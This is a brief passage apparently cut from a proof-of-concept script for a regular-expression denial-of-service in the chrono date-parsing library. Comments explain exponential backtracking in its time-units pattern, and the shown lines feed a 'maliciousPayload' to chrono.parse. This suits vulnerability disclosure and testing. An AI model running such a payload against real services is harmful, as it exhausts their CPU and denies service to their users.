   console.log(`Payload length: ${maliciousPayload.length} characters.`);

   // chrono.parse invokes the internal TIME_UNITS_PATTERN matching phase.
   // As the engine backtracks, its complexity becomes O(2^n). It will quickly 
   // exceed the internal backtracking limit (~30000 steps), resulting in a 
   // RangeError/Stack Overflow or severe CPU exhaustion in a controlled environment.
   chrono.parse(maliciousPayload);
